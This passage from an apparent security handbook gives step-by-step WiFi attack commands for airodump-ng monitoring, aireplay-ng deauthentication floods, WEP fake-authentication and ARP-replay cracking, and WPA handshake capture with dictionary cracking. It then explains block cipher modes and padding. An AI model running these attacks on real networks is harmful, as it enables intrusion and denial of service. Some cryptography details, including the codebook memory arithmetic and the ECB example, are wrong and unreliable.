<p>Finally, you should restart the process killed by <code>airmon-ng</code>:</p>
<pre><code>sudo systemctl start NetworkManager 
</code></pre>
<h1 id="capturing-wifi-traffic"><a class="header" href="#capturing-wifi-traffic">Capturing WiFi Traffic</a></h1>
<p>WiFi hacking relies heavily on the traffic captured from the air. A very useful tool which can accomplish this task is <code>airodump-ng</code>. Its basic syntax looks like this:</p>
<pre><code>sudo airodump-ng &lt;dev&gt;
</code></pre>
<p>By default, it monitors all networks in the area by hopping around channels.</p>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airodump_monitor_all.png" alt="" /></p>
<p>If 5GHz WiFi is supported by your adapter, you can add <code>--band a</code> to the command to listen for 5GHz networks:</p>
<pre><code>sudo airodump-ng --band a &lt;dev&gt;
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airmon_monitor_all_5ghz.png" alt="" /></p>
<p>Let's decipher the output. The first table, which <code>airodump-ng</code> displays, describes all the networks that are seen by the wireless adapter. </p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Column</th><th>Description</th></tr></thead><tbody>
<tr><td style="text-align: center"><code>BSSID</code></td><td>The MAC address of the access point.</td></tr>
<tr><td style="text-align: center"><code>PWR</code></td><td>The signal level reported by the wireless adapter. Strong signals are around <code>-40</code>, average ones ~ <code>-55</code>, and a weak signal begins at <code>-70</code>. If it is equal to <code>-1</code> everywhere, then signal level reporting is not supported by the driver. If it is <code>-1</code> for some APs, then that access point is out of range but at least one frame was able to be sent to it.</td></tr>
<tr><td style="text-align: center"><code>Beacons</code></td><td>The number of beacon frames sent by the AP. Through these packets the AP announces its presence to the devices in the area. They are typically sent about 10 times per second at the lowest rate (1M) and can be picked up from afar.</td></tr>
<tr><td style="text-align: center"><code>#Data</code></td><td>The number of captured data packets (if WEP, unique IV count), including data broadcast packets.</td></tr>
<tr><td style="text-align: center"><code>#/s</code></td><td>The number of data packets per second for the last 10 seconds.</td></tr>
<tr><td style="text-align: center"><code>CH</code></td><td>The channel number (as reported by the beacon frames). It is sometimes possible to capture packets from different channels due to interference or channel overlap, even when <code>airodump-ng</code> is not hopping.</td></tr>
<tr><td style="text-align: center"><code>MB</code></td><td>The maximum speed supported by the AP. If <code>MB = 11</code>, it's 802.11b, if <code>MB = 22</code> it's 802.11b+ and up to 54 are 802.11g. Higher values are either 802.11n or 802.11ac. A dot after this value indicates support for a short preamble, an <code>e</code> indicates that the network has QoS enabled.</td></tr>
<tr><td style="text-align: center"><code>ENC</code></td><td>The encryption algorithm in use. <code>OPN</code> means no encryption, <code>WEP</code> indicates static or dynamic WEP, <code>&quot;WEP?&quot;</code> = WEP or higher (not enough data to choose between WEP and WPA/WPA2), and <code>WPA</code>, <code>WPA2</code> or <code>WPA3</code> if TKIP or CCMP is present (WPA3 with TKIP allows WPA or WPA2 association, pure WPA3 only allows CCMP). <code>OWE</code> is for Opportunistic Wireless Encryption, or Enhanced Open.</td></tr>
<tr><td style="text-align: center"><code>CIPHER</code></td><td>The detected cipher - <code>CCMP</code>, <code>WRAP</code>, <code>TKIP</code>, <code>WEP</code>, <code>WEP40</code>, or <code>WEP104</code>. Typically, TKIP is used with WPA and CCMP with WPA2. WEP40 is displayed when the key index is greater than 0. The index can be 0-3 for 40bit and should be 0 for 104 bit.</td></tr>
<tr><td style="text-align: center"><code>AUTH</code></td><td>The authentication protocol in use - <code>MGT</code> (WPA/WPA2 using a separate authentication server), <code>SKA</code> (shared key for WEP), <code>PSK</code> (pre-shared key for WPA/WPA2), or <code>OPN</code> (open for WEP).</td></tr>
<tr><td style="text-align: center"><code>ESSID</code></td><td>The display name (SSID) of the network. If it has the form of <code>&lt;length: x&gt;</code>, then the SSID is hidden and the <code>x</code> represents its length (<code>airodump-ng</code> is capable of some analysis of hidden SSIDs). If <code>x</code> is 0 or 1, then the real length is indeterminable.</td></tr>
</tbody></table>
</div>
<p>The second table describes all the <em>clients</em> which are seen by the wireless adapter. A client here means any device that is WiFi-enabled, but is <em>not</em> an access point - this can be a phone, a PC, a laptop, etc. </p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Column</th><th>Description</th></tr></thead><tbody>
<tr><td style="text-align: center"><code>STATION</code></td><td>The MAC address of the client.</td></tr>
<tr><td style="text-align: center"><code>BSSID</code></td><td>The MAC address of the AP that the client is connected to. If the client is not associated with any network, then this will be <code>(not associated)</code>.</td></tr>
<tr><td style="text-align: center"><code>PWR</code></td><td>The signal level reported by the wireless adapter (see the above table). If this is <code>-1</code> everywhere, then signal level reporting is likely unsupported. If this is <code>-1</code>, then the device is out for reach for your wireless adapter, but a frame sent to it by the AP was detected.</td></tr>
<tr><td style="text-align: center"><code>Rate</code></td><td>The client's last seen reception rate followed by its last seen transmission rate (both in Mbps). An <code>e</code> is appended to each rate if QoS is enabled on the network.</td></tr>
<tr><td style="text-align: center"><code>Lost</code></td><td>The number of data packets lost from the client over the last 10 seconds. Calculated based on the sequence numbers.</td></tr>
<tr><td style="text-align: center"><code>Frames</code></td><td>The number of data packets sent by the client.</td></tr>
<tr><td style="text-align: center"><code>Notes</code></td><td>Any additional information about the client, such as captured EAPOL or PMKID.</td></tr>
<tr><td style="text-align: center"><code>Probes</code></td><td>The ESSIDs probed by the client. These are the networks the client is trying to connect to if it is not currently connected.</td></tr>
</tbody></table>
</div>
<p><code>airodump-ng</code> can be locked onto a channel or a set of channels with the following commands:</p>
<pre><code>sudo airodump-ng -c &lt;channel&gt; &lt;dev&gt;
</code></pre>
<pre><code>sudo airodump-ng -c &lt;channel1&gt;,&lt;channel2&gt;,... &lt;dev&gt;
</code></pre>
<p>Moreover, it can be locked to a specific AP by providing it with a BSSID and a channel:</p>
<pre><code>sudo airodump-ng --bssid &lt;BSSID&gt; -c &lt;channel&gt; &lt;dev&gt;
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airodump_monitor_single.png" alt="" /></p>
<p>It is often times useful to write the data captured to a file, which can be done with the <code>--write</code> argument:</p>
<pre><code>sudo airodump-ng --write &lt;filename&gt;
</code></pre>
<p><code>airodump-ng</code> will generate a bunch of files based on the given filename:
<img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airodump_list_capture_files.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-39"><a class="header" href="#introduction-39">Introduction</a></h1>
<p>A deauthentication, or deauth, attack injects <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Authentication%20Frames.html#deauthentication-frame">deathentication frames</a> in order to disconnect a target from a network. It works on pretty much any network and can be extremely useful in many other attacks in order to force a handshake, since most devices automatically try to connect to any networks in the area that they recognise. Moreover, a deauth attack can serve as a DOS attack, temporarily precluding a particular client from connecting to a network.</p>
<p><code>aireplay-ng</code> can be to disconnect a device already connected to the network:</p>
<pre><code>aireplay-ng --deauth &lt;count&gt; -a &lt;access point&gt; -c &lt;client&gt; -D &lt;dev&gt;
</code></pre>
<ul>
<li><code>--deauth</code> specifies the amount of deauth frames to send. If this is 0, then <code>aireplay-ng</code> will produce a continuous stream of deauthentication packets, resulting in a DOS attack.</li>
<li><code>-a</code> is the MAC address (BSSID) of the network you want to attack.</li>
<li><code>-c</code> is the MAC address (BSSID) of the device you want to disconnect from the network. If this is not specified, <code>aireplay-ng</code> will disconnect all devices connected to the network.</li>
<li><code>-D</code> will ensure that the deauth packets are forcibly sent. The attack may not work if this option is not specified, since <code>aireplay-ng</code> will look for the target network in all channels and may not find it in time. This can be omitted if the wireless adapter is already locked on a specific channel by, for example, <code>airodump-ng</code> when listening to a particular network and channel. </li>
<li><code>&lt;dev&gt;</code> is the wireless adapter you wish to use for the attack.</li>
</ul>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_aireplay_deauth.png" alt="" /></p>
<p>If the target is not disconnected on the first try, you can always send more deauthentication frames!</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-40"><a class="header" href="#introduction-40">Introduction</a></h1>
<p>The standard was introduced in 1997 and its goal was to provide the same level of privacy to wireless networks that wired ones had. Unfortunately, a series of severe flaws quickly made it obsolete and it was superseded by WPA and WPA2. While rare, it is still possible to find networks today which use WEP. </p>
<p>As a corollary of the IV's small size - only 24 bits - IVs will have to eventually be repeated. On average, this occurs every 6 000 frames. Due to the inner structure of WEP, once an attacker gets their hands on two ciphertexts (encrypted packets), \( c_1 \) and \( c_2 \), which were encrypted with the same IV (the key is already the same for both of them), then they know \( c_1 \oplus c_2 \). Now, the adversary can begin brute-forcing the corresponding plaintexts, \( p_1 \) and \( p_2 \). Typically, there would be a large number of possible \( p_1 \)s and \( p_2 \)s, but it is known that they must look like packets which greatly reduces the possibilities. This is narrowed down even further when performing a fake authentication attack since the packets captured with identical IVs are likely ARP responses from the AP which have an even easier form to predict! 
Since \( c_1 \oplus c_2 = p_1 \oplus p_2 \), with the correct \( p_1 \) and \( p_2 \) brute-forced, the keystream used to encrypt them can be calculated: \( c_1 \oplus p_1 = k \). Through the use of a few more techniques such as Fluhrer, Mantin, and Shamir (FMS) attacks or PWT, the original key can be retrieved.</p>
<h1 id="capturing-the-traffic"><a class="header" href="#capturing-the-traffic">Capturing the Traffic</a></h1>
<p>The only thing that's really required for this attack is enough captured packets with as many IVs as possible. The higher the number of frames, the better the odds that a pair of them was encrypted with the same IV.</p>
<p><code>airodump-ng</code> can be used to listen for WEP networks with the following syntax.</p>
<pre><code>sudo airodump-ng --encrypt WEP &lt;dev&gt;
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WEP_airodumpg_monitor_wep_networks.png" alt="" /></p>
<p>Once the network to be attacked has been identified, it can be specifically monitored with <code>airodump-ng</code>. You should now also specify a capture file:</p>
<pre><code>sudo airodump-ng --encrypt WEP --bssid &lt;BSSID&gt; -c &lt;channel&gt; -w &lt;filename&gt; &lt;dev&gt;
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WEP_monitor_specific_network.png" alt="" /></p>
<p>Now, you will need to be patient in order to gather a large amount of frames, typically in the range of 50K - 200K depending on whether the key is 64 or 128 bits in length. On a calm network, however, this process may take a very long time. Luckily, it can be sped up using a <em>fake authentication attack</em> and <em>ARP packet replay</em>.</p>
<h1 id="fake-authentication-attack"><a class="header" href="#fake-authentication-attack">Fake Authentication Attack</a></h1>
<p>The ultimate goal of this attack is to enable an adversary to force the AP to send out more and more packets, typically through ARP replay, so that more IVs can be captured. However, in order to elicit any proper response with an IV from the access point, the attacker must be authenticated and and their MAC address needs to be associated with it. Otherwise, the AP simply replies with a deauth frame in cleartext to any packets sent by the adversary, which generates no IVs.</p>
<p>WEP supports two types of authentication - <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(IEEE%20802.11)/Authentication%20&amp;%20Association.html#open-authentication">Open System Authentication (OSA)</a> and <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(IEEE%20802.11)/Authentication%20&amp;%20Association.html#shared-key-authentication">Shared Key Authentication</a>. </p>
<p>On the other hand, now that they are associated with the network, they can elicit responses with IVs from the AP.</p>
<p>When OSA is enabled, you can use the following command to authenticate with the AP:</p>
<pre><code>sudo aireplay-ng -1 &lt;rate&gt; -e &lt;ESSID&gt; -a &lt;access point MAC&gt; -h &lt;MAC of your wireless adapter&gt; &lt;dev&gt;
</code></pre>
<ul>
<li><code>-1</code> denotes fake authentication.</li>
<li><code>&lt;rate&gt;</code> - is the rate at which to attempt reassociation. 0 means a continuous stream of attempts until success.</li>
<li><code>-e</code> - the ESSID of the target network.</li>
<li><code>-a</code> - the BSSID of the target network.</li>
<li><code>-h</code> - the MAC address of your wireless adapter.</li>
</ul>
<p>Note, <code>airodump-ng</code> should be locked to the target network and its channel, so as to prevent channel hopping.</p>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WEP_fake_auth_open_success.png" alt="" /></p>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WEP_airodump_fake_auth_open_success.png" alt="" /></p>
<p>Now that the client is associated with the network, they can elicit responses with IVs from the AP and can proceed to ARP relaying.</p>
<p>If OSA is not allowed by the target network, then the process is a <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(IEEE%20802.11)/Authentication%20&amp;%20Association.html#shared-key-authentication">bit more complicated</a>, but still not secure.</p>
<p>If you are able to sniff on the network, you can just capture the shared key handshake when another client authenticates to the AP (either naturally or by dint of a <a href="Hardware%20Hacking/Wireless%20Attacks/Deauth%20Attack.html">deauth attack</a>. Since you captured the plaintext challenge, \( p_1 \) from the AP and the correctly encrypted response challenge from the legitimate client, \( c_1 \), you can obtain the keystream \( k = p_1 \oplus c_1 \) and use it to correctly encrypt the challenge you receive when attempting to connect to the AP yourself.</p>
<p>Faking shared key authentication requires a PRGA file containing the SKA (shared key authentication) handshake. To acquire it, all you need to do is sniff on the network and either wait for a client to connect to it or deauthenticate an existing one to force them to reconnect. When the handshake has been captured, <code>SKA</code> will appear beneath the <code>AUTH</code> column in <code>airodump-ng</code>.</p>
<pre><code>sudo airodump-ng --encrypt WEP --bssid &lt;BSSID&gt; -c &lt;channel&gt; -w &lt;filename&gt; &lt;dev&gt;
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WEP_capture_ska.png" alt="" /></p>
<p>The <code>.xor</code> file is the required PRGA file which can now be used with <code>aireplay-ng</code> to do fake authentication:</p>
<pre><code>sudo aireplay-ng -1 &lt;rate&gt; -e &lt;ESSID&gt; -a &lt;access point MAC&gt; -h &lt;MAC of your wireless adapter&gt; -y &lt;PRGA file&gt; &lt;dev&gt;
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WEP_fake_auth_ska_success.png" alt="" /></p>
<p>You can now proceed with ARP replaying in order to generate IVs.</p>
<h2 id="arp-replay-attack"><a class="header" href="#arp-replay-attack">ARP Replay Attack</a></h2>
<p>An ARP replay attack is one of the easiest ways to generate new IVs. <code>aireplay-ng</code> will listen for ARP packets on the network and once it gets its hands on at least one packet, it is going to save it into a capture file and continuously resend it to the AP. While the ARP packet itself is not going to change, the responses it will beget from the access point will all generate new IVs. At this point, <code>airodump-ng</code> should also be running in order to capture the responses and their IVs. </p>
<p>Since some ARP packets are typically sent when a device connects to a network, you can using a <a href="Hardware%20Hacking/Wireless%20Attacks/Deauth%20Attack.html">deauth attack</a> to speed up the process of gathering samples.</p>
<p>The basic syntax for an ARP replay is the following:</p>
<pre><code>sudo aireplay-ng -3 -b &lt;BSSID of the target network&gt; -h &lt;MAC address of your wireless adapter&gt; &lt;dev&gt;
</code></pre>
<p>A capture file with ARP packets from a previous ARP relay attack may be optionally specified with <code>-r</code>.</p>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WEP_aireplay_arp_replay.png" alt="" /></p>
<p>Once run, the Frames and Data count in <code>airodump-ng</code> should begin rapidly increasing, while the response packets with the IVs are captured.</p>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WEP_airodump_arp_replay.png" alt="" /></p>
<h1 id="cracking-the-key"><a class="header" href="#cracking-the-key">Cracking the Key</a></h1>
<p>Once you have a sufficient number of IVs, you can use the <code>.cap</code> file generated by <code>airodump</code> to crack the key:</p>
<pre><code>aircrack-ng &lt;filename&gt;
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WEP_aircrack_crack_key.png" alt="" /></p>
<p>If the key isn't found, then that means that no identical IVs were captured and the process needs to be repeated.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-41"><a class="header" href="#introduction-41">Introduction</a></h1>
<p>When connecting a device to a <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(IEEE%20802.11)/WiFi%20Protected%20Access%20(WPA).html">WPA</a> WiFi network, the device and the access point go through the process of a <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(IEEE%20802.11)/Authentication%20&amp;%20Association.html">4-way handshake</a>. During this time, the hash of the password is broadcasted and if we can capture this hash, we can also attempt to crack it.</p>
<h1 id="capturing-the-handshake"><a class="header" href="#capturing-the-handshake">Capturing the Handshake</a></h1>
<p>You will first need to put your adapter into <a href="Hardware%20Hacking/Wireless%20Attacks/index.html">monitor mode</a>:</p>
<pre><code>sudo airmon-ng start &lt;dev&gt;
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airmon_start.png" alt="" /></p>
<p>Next, you should listen for the available access points by using</p>
<pre><code>sudo airodump-ng &lt;dev&gt;
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airodump_monitor_all.png" alt="" /></p>
<p>Once you have identified the network you want to attack, you can make <code>airodump</code> specifically listening for it by providing a MAC address (<code>--bssid</code>) and a channel (<code>-c</code>). You will also want to write the capture to a file (<code>--write &lt;filename&gt;</code>), so that it may later be cracked with <code>aircrack-ng</code>:</p>
<pre><code>sudo airodump-ng --bssid 50:D4:F7:95:CE:13 -c 11 --write PwnMe
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airodump_monitor_single.png" alt="" /></p>
<p>Now, <code>airodump</code> is listening for the specified access point. Under the <code>STATION</code> tab, you can see all devices which are connected to the network. </p>
<p>You now have to wait for someone new to connect to the target network or to reconnect in order to capture the handshake. If you are too impatient, however, there is a way to speed this process up. A <a href="Hardware%20Hacking/Wireless%20Attacks/Deauth%20Attack.html">deauth attack</a> may be used, giving us the handshake:</p>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_handshake_captured.png" alt="" /></p>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airodump_list_capture_files.png" alt="" /></p>
<p>The hash can now be cracked using <code>aircrack-ng</code>:</p>
<pre><code>aircrack-ng &lt;capture&gt; -w &lt;wordlist&gt;
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_aircrack.png" alt="" /></p>
<p>Boom! We successfully cracked the very difficult-to-guess password of... <code>password</code>.</p>
<p>Remember to stop your adapter's monitor mode or you will not be able to use it normally:</p>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airmon_stop.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-42"><a class="header" href="#introduction-42">Introduction</a></h1>
<p>Cryptography is the study and application of techniques for secure communication in the presence of adversarial behaviour. It is concerned with the confidentiality of data. All cryptography is built around the use of <em>ciphers</em> or, in modern parlance, <em>encryption schemes</em>. </p>
<p>Cryptrography is typically divided into two fields - symmetric (private-key) cryptography and asymmetric (public-key) cryptography - and depending on which field we are in, an encryption scheme will look differently, but the basic terminology is usually shared.</p>
<p>Furthermore, you might hear the terms &quot;classical&quot; and &quot;modern&quot; cryptography being tossed around. The difference lies in the fact that the former does not make use of today's computational resources and is therefore unable to keep up with modern cryptography. Moreover, modern cryptography has its roots in mathematics and is subject to much more scrutiny and mathematical analysis. It is built around certain <a href="Cryptography/Principles%20of%20Modern%20Cryptography.html">principles</a>.</p>
<h1 id="attack-models"><a class="header" href="#attack-models">Attack Models</a></h1>
<ol>
<li><strong>Ciphertext-only attack (COA)</strong> - this is the most basic scenario. The adversary has access to a set of ciphertexts and attempts to glean whatever they can about the underlying plaintexts, but are unable to perform any encryption or decryption queries themselves.</li>
<li><strong>Known plaintext attack (KPA)</strong> - here, the attacker is provided with a set of plaintext-ciphertext pairs generated with some key. Their ultimate goal is to find out information about the plaintext of <em>another</em> ciphertext generated with the same key. Once again, the attacker is not capable of performing any encryption or decryption queries themselves.</li>
<li><strong>Chosen plaintext attack (CPA)</strong> - this model is equivalent to the previous one, however, the attacker is capable of choosing specifically which plaintext-ciphertext pairs they have access to. In other words, the attacker can perform encryption queries as they will, but have no access to the key.</li>
<li><strong>Chosen ciphertext attack (CCA)</strong> - in this model, the adversary is capable of both encrypting and decrypting any message they like, but lack the key. This scenario is most useful when it is not the output that is important but rather the key.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-43"><a class="header" href="#introduction-43">Introduction</a></h1>
<p>A block cipher is an encryption scheme which works on plaintexts of a fixed size. Furthermore, it is usually paired with a <em>mode of operation</em>. The size is typically small, such as 64 or 128 bits, although, it is possible to have smaller or larger block sizes. Large block sizes have a lofty memory footprint and are less efficient. It is, however, paramount that the block size is also not too small lest the cipher becomes vulnerable to a codebook attack. This attack is actuated by the construction of a look-up table which contains all possible plaintext-ciphertext pairs generated by a given block cipher and can be easily used to look up a plaintext given its ciphertext. For example, a block size of 16 requires only \( 2^{16} \times 2^{16} = 2^{20} \) bits of memory, which is equal to 128 kilobytes. With the 32-bit blocks, the memory needs grow to 16 gigabytes which is still feasible. However, with a block size of 64 bits, the memory required shoots up to \( 2^{70} \) bits. Good luck storing that.</p>
<h1 id="anatomy-of-a-block-cipher"><a class="header" href="#anatomy-of-a-block-cipher">Anatomy of a Block Cipher</a></h1>
<p>Block ciphers represent a repetition of <em>rounds</em>, which are short and simple sequences of operation. The strength of a block cipher lies not in its complexity, but rather its repetitiveness. The ciphertext of a given block is the sequence of rounds applied to the plaintext: \( c = R_3(R_2(R_1(p, {k^{\prime}}), {k^{\prime\prime}}),{k^{\prime\prime\prime}}) \). In addition to the output of the previous round, each round also takes in a <em>round key</em>. The round keys \( k^{\prime},k^{\prime\prime},k^{\prime\prime\prime},... \) are generated from the master key \( k \) through an algorithm bearing the name <em>key schedule</em>. The round functions \( R_1, R_2,... \) are usually the same algorithm which why it is crucial that they are provided with different round keys in order to generate different outputs.</p>
<h2 id="slide-attacks-and-round-keys"><a class="header" href="#slide-attacks-and-round-keys">Slide Attacks and Round Keys</a></h2>
<p>Repeating round keys open room for <em>slide attacks</em>. These look for plaintext-ciphertext pairs \( (p_1, c_1) \) and \( (p_2, c_2) \) where \( p_2 = R(p_1) \). Since both the round algorithm and key are identical, then if \( p_2 = R(p_1) \) implies that \( c_2 = R(c_1) \). This relationship will hold true no matter how many repetitions of the round the plaintext goes through.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-44"><a class="header" href="#introduction-44">Introduction</a></h1>
<p>A non-conforming message is a message whose length is not evenly divisible by the block size. For example, you might have a message of size 18 bytes and a block size of 16 bytes. In this case, there are two main ways to resolve the issue.</p>
<h1 id="message-padding"><a class="header" href="#message-padding">Message Padding</a></h1>
<p>Padding allows for the encryption of messages of arbitrary lengths, even ones which are shorter than a single block. It is used to expand a message in order to fill a complete block by appending bytes to the plaintext and it is a highly standardised procedure. </p>
<p>The most common padding algorithm is described by PKCS#7 in RFC 5652.</p>
<p>Given a block size, \( n \), and a message of length \( m \), the message is padded with \( n-m \) number of bytes of value \( n-m \).  A concrete example with 16-byte blocks is the following:</p>
<ul>
<li>If there's is one byte left until the message length is divisible by 16 - for example, it is 17 or 33 bytes long - then pad the message with 15 bytes <code>0x0f</code> (15 in decimal).</li>
<li>If there are two bytes left until the message length is divisible by 16 - for example, it is 18 or 34 bytes long - then pad the message with 14 bytes <code>0x0e</code> (14 in decimal).</li>
<li>If there are three bytes left until the message length is divisible by 16, then pad the message with 13 bytes <code>0x0d</code> (13 in decimal), and so on.</li>
</ul>
<p>If the message length is already divisible by the block size, then an additional <em>block</em> containing bytes with value equal to the block size is appended in order to signify to the decryption algorithm whether the last block is part of the plaintext or just padding. In the above example, if the message length was already divisible by 16, then another 16 bytes of value <code>0x10</code> would have been appended to it.</p>
<p>Decryption is fairly simple and works by first deciphering all the unpadded blocks. Subsequently, the last block is decrypted and the last bytes of the resulting plaintext are checked for conformity with the aforementioned scheme. If such is not found, the message is rejected. Otherwise, the padding bytes are stripped before returning the plaintext.</p>
<p>Note that if not implemented properly, padding may be vulnerable to <a href="Cryptography/Block%20Ciphers/Padding%20Oracle%20Attack.html">Padding Oracle Attacks</a>.</p>
<h1 id="ciphertext-stealing"><a class="header" href="#ciphertext-stealing">Ciphertext Stealing</a></h1>
<p>Ciphertext stealing is another technique for encrypting messages of arbitrary length. Whilst more complex, it has several benefits:</p>
<ul>
<li>Plaintexts are allowed to be of any <em>bit</em> length and are not restrained to bytes - it is possible to encrypt a message which is 155 bits long.</li>
<li>Ciphertext have the same length as plaintexts.</li>
</ul>
<p>In CBC mode, ciphertext stealing extends the last incomplete plaintext block by taking bits from the previous ciphertext block, thus splitting the penultimate ciphertext block. Once the last plaintext block is complete, it is encrypted and its ciphertext is placed as the penultimate ciphertext block. Now, the first bits (the ones which were not appended) of the broken ciphertext block are placed at the end as a reduced ciphertext block, meaning that the last ciphertext block has a length less than the block size.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Block_Cipher_Ciphertext_Stealing.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-45"><a class="header" href="#introduction-45">Introduction</a></h1>
<p>It's all well and good with block ciphers when encrypting messages whose length matches the block size, but what happens if we want to encrypt a plaintext that is longer than a single block? Well, here comes the use of a <em>mode of operation</em>. If the message is longer than the block size, then it must be split into blocks of the desired size. From then on, the mode of operation describes how each of the blocks is encrypted and how the resulting ciphertexts are combined into the final output.</p>
<h1 id="the-electronic-codebook-ecb-mode"><a class="header" href="#the-electronic-codebook-ecb-mode">The Electronic Codebook (ECB) Mode</a></h1>
<p>This is the simplest mode of operation you could think of. It encrypts each plaintext block independently and then just concatenates the resulting ciphertexts. </p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Block_Cipher_ECB_Encrypt.png" alt="" /></p>
<p>This mode is abominably insecure, since it is <em>pattern preserving</em>. While patterns inside each block are destroyed (a proper encryption algorithm should take care of that), patterns between blocks are ultimately preserved. To illustrate, let's say that you want to encrypt the number 19281267. If you have 4-bit blocks, you would encrypt the blocks 1928 and 1267. Suppose, that these get encrypted to 4765 and 4104. If you check, subtracting the second plaintext block from the first yields the same result as subtracting the second ciphertext from the first, namely 661. An infamous example of this is the ECB penguin. Encrypting an image with ECB will yield the same image with merely a distorted colour scheme.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Block_Cipher_ECB_Penguin.png" alt="" /></p>
<h1 id="the-cipher-block-chaining-cbc-mode"><a class="header" href="#the-cipher-block-chaining-cbc-mode">The Cipher Block Chaining (CBC) Mode</a></h1>
<p>Cipher block chaining resembles ECB, but it actually incorporates the previous block into the encryption of the current one. Instead of encrypting the \( i \)th block \( p_i \) as \( c_i = Enc_k(p_i) \), cipher block chaining XORs the plaintext with the previous ciphertext: \( c_i = Enc_k(p_i \bigoplus c_{i-1}) \). The first plaintext is XOR-ed with a random value called an <em>initialisation vector (IV)</em>.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Block_Cipher_CBC_Encrypt.png" alt="" /></p>
<p>Since each consecutive block depends on the previous one, patterns between blocks are destroyed. Furthermore, if the IV is different each time, two identical plaintexts will produce disparate ciphertexts when encrypted. Note, that for decryption, the IV needs to be known. It is also interesting to mention that CBC decryption can be much faster than encryption due to parallelism. When encrypting, each new block needs to wait for the previous one to be encrypted in order to get its ciphertext, however, with decryption all ciphertexts are already known, so it can optimised on multiple threads.</p>
<h1 id="the-counter-mode-ctr"><a class="header" href="#the-counter-mode-ctr">The Counter Mode (CTR)</a></h1>
<p>The Counter mode is a bit different to the ones described above. It turns a block cipher into a stream cipher - in fact, it doesn't even encrypt the blocks themselves! 
This mode is comprised of an IV, often in this case called a <em>nonce</em>, and a counter. The counter may be any function which is guaranteed to generate a sequence which will not repeat for a long time. That being said, it is still very common to just use a simple increment-by-one counter. </p>
<p>The way that the CTR mode works is by taking the nonce and the counter for the current block (the counter is incremented for each block) and combining them together. If the nonce is random, it may be combined with the counter by means of any invertible operation such as addition, concatenation, or XOR-ing. Should that not be the case, then the nonce and the counter should be concatenated, since simply adding or XOR-ing them would break the security under a chosen plaintext attack, since an attacker may be able to manipulate the entire nonce–counter pair to cause a collision. Once they have control over the nonce-counter pair and plaintext, XOR-ing the ciphertext with the plaintext would produce a value that can be XOR-ed with the other block sharing the same nonce-counter pair in order to decrypt it.</p>
<p>After this, the nonce-counter pair is encrypted with the key and then XOR-ed with the plaintext block in order to produce the ciphertext.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Block_Cipher_CTR_encrypt.png" alt="" /></p>
<p>It is paramount that the nonce is unique between messages, since when encrypting two plaintexts with the same nonce-counter stream - \( c_1 = p_1 \bigoplus S \) and \( c_2 = p_2 \bigoplus S \), then \( c_1 \bigoplus c_2 \) reveals \( p_1 \bigoplus p_2 \).</p>
<p>Furthermore, a random nonce is sufficient only if it is long enough. Given a nonce of length \( n \) bits, it is likely that after \( 2^{n/2} \) encryptions collisions will start occurring. Therefore, a 64-bit nonce is abominable due to the fact that collisions will commence after approximately \( 2^{32} \) encryptions, which is a very low number. </p>
<p>Decryption works by XOR-ing the ciphertext with the appropriate nonce-counter pair.</p>
<p>A particular benefit of the CTR mode is that it is parallelisable and can thus execute rather quickly. You can even begin encryption before having the message to encrypt by selecting a nonce and computing the nonce-counter stream which will be later XOR-ed with the plaintext.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-46"><a class="header" href="#introduction-46">Introduction</a></h1>
